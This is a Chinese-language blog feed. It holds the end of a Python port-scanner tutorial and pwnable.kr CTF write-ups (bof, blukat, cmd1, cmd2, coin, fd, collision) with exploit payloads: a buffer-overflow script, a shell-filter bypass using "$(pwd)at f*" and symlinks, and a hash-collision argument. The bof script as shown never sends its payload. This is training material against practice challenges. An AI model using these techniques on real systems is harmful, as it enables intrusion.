print(<span class="string">&quot;[*]正在扫描&quot;</span>)</span><br><span class="line">    scan_port(ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_web</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标网址&quot;&quot;&quot;</span></span><br><span class="line">    web = input(<span class="string">&quot;[+]输入扫描网址:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;http://&quot;</span> <span class="keyword">in</span> web <span class="keyword">or</span> <span class="string">&quot;https://&quot;</span> <span class="keyword">in</span> web:</span><br><span class="line">        web = web[web.find(<span class="string">&#x27;://&#x27;</span>) + <span class="number">3</span>:]</span><br><span class="line">        print(web)</span><br><span class="line">        print(<span class="string">&quot;[*]正在分析网站服务器IP&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server_ip = socket.gethostbyname(str(web))</span><br><span class="line">        print(<span class="string">&quot;[*]服务器IP为%s&quot;</span> % server_ip)</span><br><span class="line">        scan_port(server_ip)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]服务器IP获取失败&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span>(<span class="params">ip</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描端口&quot;&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*]开始扫描目标端口&quot;</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line">    g = gevent.pool.Pool(<span class="number">50</span>)  <span class="comment"># 设置线程数</span></span><br><span class="line">    run_list = []</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">65535</span>):</span><br><span class="line">        run_list.append(g.spawn(TCP_connect, ip, port))</span><br><span class="line">    gevent.joinall(run_list)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;[*]总耗时%s&quot;</span> % time.strftime(<span class="string">&quot;%H:%M:%S&quot;</span>, time.gmtime(end - start)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;1.通过IP扫描端口&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;2.通过网址扫描端口&quot;</span>)</span><br><span class="line">    uc = int(input(<span class="string">&quot;[+]请输入选择:&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> == uc:</span><br><span class="line">        scan_ip()</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">2</span> == uc:</span><br><span class="line">        scan_web()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[!]输入有误&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>这里展示部分运行结果：</p>
<h4 id="选择通过网址扫描端口"><a href="#选择通过网址扫描端口" class="headerlink" title="选择通过网址扫描端口"></a>选择通过网址扫描端口</h4><p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/3.png" class></strong></p>
<h4 id="选择通过IP扫描端口"><a href="#选择通过IP扫描端口" class="headerlink" title="选择通过IP扫描端口"></a>选择通过IP扫描端口</h4><p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/4.png" class></strong></p>
<h3 id="使用nmap扫描"><a href="#使用nmap扫描" class="headerlink" title="使用nmap扫描"></a>使用nmap扫描</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nmap</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.56.1&#x27;</span></span><br><span class="line"><span class="comment"># 把nmap.exe的路径放入PortScanner中，否则会有环境变量错误</span></span><br><span class="line">nm = nmap.PortScanner(nmap_search_path=(<span class="string">&#x27;nmap&#x27;</span>, <span class="string">r&quot;E:\nmap\nmap.exe&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">130</span>, <span class="number">136</span>):</span><br><span class="line">    result = nm.scan(host, str(port))</span><br><span class="line">    <span class="comment"># 在主机192.168.56.1上获取端口22/tcp状态</span></span><br><span class="line">    state = result[<span class="string">&#x27;scan&#x27;</span>][<span class="string">&#x27;192.168.56.1&#x27;</span>][<span class="string">&#x27;tcp&#x27;</span>][int(port)][<span class="string">&#x27;state&#x27;</span>]</span><br><span class="line">    print(<span class="string">&#x27;[%s] port state: %s&#x27;</span> % (port, state))</span><br></pre></td></tr></table></figure>

<p>使用<strong>netstat -an</strong>查看本机开启的端口服务，用端口135测试代码运行的正确性</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/1.png" class></strong></p>
<p>也可以直接使用zenmap工具进行端口扫描：</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/5.png" class></strong></p>
]]></content>
      <categories>
        <category>Python</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>bof</title>
    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/4.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/1.png" class></strong></p>
<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/2.png" class></strong></p>
<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/3.png" class></strong></p>
<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>blukat</title>
    <url>/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/0.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/1.png" class></strong></p>
<h3 id="查看blukat-c源文件"><a href="#查看blukat-c源文件" class="headerlink" title="查看blukat.c源文件"></a>查看blukat.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span>* key = <span class="string">&quot;3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc_flag</span><span class="params">(<span class="keyword">char</span>* s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line">                flag[i] = s[i] ^ key[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FILE* fp = fopen(<span class="string">&quot;/home/blukat/password&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        fgets(password, <span class="number">100</span>, fp);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;guess the password!\n&quot;</span>);</span><br><span class="line">        fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(password, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;congrats! here is your flag: &quot;</span>);</span><br><span class="line">                calc_flag(password);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong guess!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序先读取password文件中的内容到password数组中，之后使用buf缓冲区读取用户输入的字符，buf缓冲区的大小为100，而读取的字符为128，之后比较用户输入的字符和password数组中的内容，如果相等，则可以执行cacl_flag函数，经过和密钥的异或运算计算出flag。如果采用缓冲区溢出覆盖fgets的返回地址为函数calc_flag的地址，由于不知道password的内容，无法正确计算出flag，因此这里缓冲区溢出攻击行不通。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>想到本题题干中的描述，本题应该是具有一种巧妙的解法（<a href="https://blog.csdn.net/jackywgw/article/details/41545957">ls-la各项说明​</a>）。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/2.png" class></strong></p>
<p>这里看到password文件的用户组含有blukat_pwn，而当前用户在blukat_pwn组，因此是具有读权限的，那运行cat命令：</p>
<p>提示没有访问权限？不，这里的文件内容就是这句话，那直接将这句话输入到可执行文件中即可拿到flag。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/3.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>cmd1</title>
    <url>/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/0.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/1.png" class></strong></p>
<h3 id="查看cmd1-c源代码"><a href="#查看cmd1-c源代码" class="headerlink" title="查看cmd1.c源代码"></a>查看cmd1.c源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/2.png" class></strong></p>
<p><a href="https://man7.org/linux/man-pages/man3/putenv.3.html">putenv函数</a>是添加或者改变一个环境变量。</p>
<p>filter函数的作用是通过<a href="https://blog.csdn.net/qq_21792169/article/details/51147489">strstr函数</a>匹配$flag、sh、tmp$三个字符串，如果检测到这三个字符串，则函数返回值不为0，会导致主函数退出，无法执行system函数。所以这里需要将我们输入的字符串隐藏起来，绕过filter函数的检查，但这里我们需要得到flag。又不能直接输入flag，于是想到可以使用通配符来代替flag。system命令的默认PWD环境变量应该是与这个程序的PWD环境变量相同，这个环境变量是什么，就是默认“./”执行的文件夹目录，一般是根据程序调用的bash窗口目录来的。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/3.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>cmd2</title>
    <url>/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd2/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd2/0.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd2/1.png" class></strong></p>
<p>这里登录的密码为cmd1解出的flag：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mommy now I get what PATH environment is <span class="keyword">for</span> :)</span><br></pre></td></tr></table></figure>

<h3 id="查看cmd2-c源代码"><a href="#查看cmd2-c源代码" class="headerlink" title="查看cmd2.c源代码"></a>查看cmd2.c源代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>** p;</span><br><span class="line">        <span class="keyword">for</span>(p=environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        delete_env();</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">    	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cmd2在cmd1的基础上，加强了过滤操作。这里$=、PATH、export、/、$`$、flag$都不可以用。</p>
<p>下面介绍一种方法：</p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>创建<a href="https://www.runoob.com/linux/linux-comm-ln.html">linux软链接</a>方法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ln -s [源文件或目录][目标文件或目录]</span><br><span class="line"># 这里如果当前文件夹下不存在该目标文件，会自动创建，软链接相当于windows的快捷方式</span><br></pre></td></tr></table></figure>

<p>首先在/tmp目录下建立自己的目录xiaohong404(这个目录可以任意取名，但不能和已经存在的文件名重复），然后创建目录*<em>/tmp/xiaohong404/c<strong>。那么，如果在/tmp/xiaohong404/c目录下执行</strong>pwd命令<strong>就可以得到这个路径字符”/tmp/xiaohong404/c“。然后在</strong>/tmp/exploit<strong>目录下构造</strong>cat<strong>的软链接</strong>ln -s /bin/cat cat<strong>，在</strong>/tmp/exploit/c<strong>下建立</strong>flag<strong>的软链接</strong>ln -s /home/cmd2/flag flag<strong>。然后在</strong>/tmp/exploit/c<strong>下执行命令</strong>/home/cmd2/cmd2”$(pwd)at f**</em>，这里表示执行cmd2程序，相当于*<em>./cmd2 “$(pwd)at f\</em>“<strong>就可以得到flag了。其原理就是利用</strong>”$(pwd)at”<strong>构造出</strong>/tmp/xiaohong404/cat**命令。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd2/2.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>coin</title>
    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/0.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/3.png" class></strong></p>
<h3 id="使用netcat连接上远程的服务器"><a href="#使用netcat连接上远程的服务器" class="headerlink" title="使用netcat连接上远程的服务器"></a>使用netcat连接上远程的服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/1.png" class></strong></p>
<p>题目是一个游戏，大致意思是，一堆硬币，有一个假币，重量为9，而其他为10，要通过给定的C次机会内找到假币。一共要在30s内找到100个假币，也就是完成100次游戏，最终会给出flag。</p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>简单的二分法，但这里不能从本地直接连远程服务器，这样会超时，需要通过之前的连接登录远程服务器，之后在服务器上编写脚本运行，下面的代码即可成功运行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	N, C = re.findall(<span class="string">&quot;N=(\d+) C=(\d+)&quot;</span>, p.recv())[<span class="number">0</span>]</span><br><span class="line">	N = int(N)</span><br><span class="line">	C = int(C)</span><br><span class="line">	print(N, C)</span><br><span class="line"></span><br><span class="line">	start, end = <span class="number">0</span>, N<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> start &lt;= end <span class="keyword">and</span> C &gt; <span class="number">0</span>:</span><br><span class="line">		mid = (start + end) // <span class="number">2</span></span><br><span class="line">		x = <span class="string">&quot; &quot;</span>.join([str(j) <span class="keyword">for</span> j <span class="keyword">in</span> range(start, mid+<span class="number">1</span>)])	<span class="comment"># build range list</span></span><br><span class="line">		p.sendline(x)</span><br><span class="line">		</span><br><span class="line">		res = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">		<span class="keyword">if</span> res % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">			start = mid+<span class="number">1</span>	<span class="comment"># through first half</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			end = mid<span class="number">-1</span>		<span class="comment"># through second half</span></span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> C &gt; <span class="number">0</span>:	<span class="comment"># use all the tries</span></span><br><span class="line">		p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">		p.recv(<span class="number">1024</span>)</span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	p.sendline(str(start))	<span class="comment"># final answer</span></span><br><span class="line">	print(p.recv())</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure>

<p>注意这里有个细节是需要先进入服务器的/tmp文件夹下，之后自己再主动建立一个新的文件夹，否则会没有权限访问python的库，一直提示未定义的错误。之后在这个新的文件夹下建立一个python文件，可以随便取个名字，这里我就命名为coin.py。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/2.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>fd</title>
    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/2.png" class></strong></p>
<h3 id="登录远程服务器"><a href="#登录远程服务器" class="headerlink" title="登录远程服务器"></a>登录远程服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/3.png" class></strong></p>
<h3 id="ls-la查看文件信息"><a href="#ls-la查看文件信息" class="headerlink" title="ls -la查看文件信息"></a>ls -la查看文件信息</h3><p><strong><a href="https://blog.csdn.net/u013197629/article/details/73608613">linux文件权限知识</a></strong></p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/4.png" class></strong></p>
<p>发现fd.c和其对应的可执行文件fd（用户有执行权限）</p>
<h3 id="cat-fd-c查看c语言代码"><a href="#cat-fd-c查看c语言代码" class="headerlink" title="cat fd.c查看c语言代码"></a>cat fd.c查看c语言代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/5.png" class></strong></p>
<p>有源代码可知，这里需要执行system函数的条件为buf缓冲区内容为LETMEIWN</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/6.png" class></strong></p>
<h3 id="read-fd-buf-32"><a href="#read-fd-buf-32" class="headerlink" title="read(fd,buf,32)"></a>read(fd,buf,32)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(fd, buf, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">fd == <span class="number">0</span>时：则表示标准输入；</span><br><span class="line">fd == <span class="number">1</span>时：则表示标准输出；</span><br><span class="line">fd == <span class="number">2</span>时，则表示标准输出错误。</span><br><span class="line">buf 表示读入的缓冲区；</span><br><span class="line"><span class="number">32</span>表示读入<span class="number">32</span>字节；</span><br></pre></td></tr></table></figure>

<p>因此我们需要设置fd为0，读取我们输入的LETMEWIN到buf缓冲区中即可获得flag。</p>
<p>注意到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = atoi(argv[<span class="number">1</span>]) - <span class="number">0x1234</span></span><br></pre></td></tr></table></figure>

<p>要使得$fd=0$，就是让main函数的第一个参数argv[1]等于$0x1234$</p>
<h3 id="fd-4660"><a href="#fd-4660" class="headerlink" title="./fd 4660"></a>./fd 4660</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/7.png" class></strong></p>
<p>注意这里参数需要转为10进制   $0x1234_{16} = 4660_{10}$</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">flag: mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>collision</title>
    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/2.png" class></strong></p>
<h3 id="查看C语言源代码"><a href="#查看C语言源代码" class="headerlink" title="查看C语言源代码"></a>查看C语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/3.png" class></strong></p>
<h3 id="main-int-argc-char-argv"><a href="#main-int-argc-char-argv" class="headerlink" title="main(int argc, char* argv[])"></a><a href="https://blog.csdn.net/LYJ_viviani/article/details/51873961">main(int argc, char* argv[])</a></h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/4.png" class></strong></p>
<p>传递三个参数$aa,bb,cc$, 程序运行结果如下:</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/5.png" class></strong></p>
<p><strong>注意：若传递n个参数，实际上相当于给main函数传递了n+1个参数，argc=n+1（因为argv[0]是路径名自动传递）</strong></p>
<h3 id="分析col-c"><a href="#分析col-c" class="headerlink" title="分析col.c"></a>分析col.c</h3><ul>
<li>函数传递了两个参数，第一个参数为int型，第二个参数为一个字符数组，main函数首先判断第一个参数如果小于2,即若不显式传递参数，则打印argv[0]之后会直接退出。</li>
<li>argv[1]，即传入的第二个参数，第一个参数为文件所在路径，指向的字符串的长度需要等于20字节。</li>
<li>check_password函数将指向20字节的字符指针转为int指针，因为int是4字节，即将20字节字符串拆分成为5个int类型的数据，之后求和。</li>
<li>如果求和的结果和给定的哈希值0x21DD09EC相等，则会执行system函数拿到flag。</li>
</ul>
<p>最直接的想法是暴力穷举，寻找哈希碰撞，但实际上这里可以直接凑出这个哈希值，可以令20字节的前16字节都设置为0x01，<strong>注意不能设置为0x00</strong>，因为0x00是一个截断字符，程序读入argv[1]时如果遇到了0x00会自动截断，从而导致程序结果有误。</p>
<p>另外，注意数据按照小端序存放：</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/6.png" class></strong></p>
<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/7.png" class></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;</span>)</span><br><span class="line"><span class="comment"># 这一inline的python表达式可以将生成的结果作为argv[1]参数</span></span><br></pre></td></tr></table></figure>

<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/8.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>flag</title>
    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/1.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/2.png" class></strong></p>
<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/3.png" class></strong></p>
<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/4.png" class></strong></p>
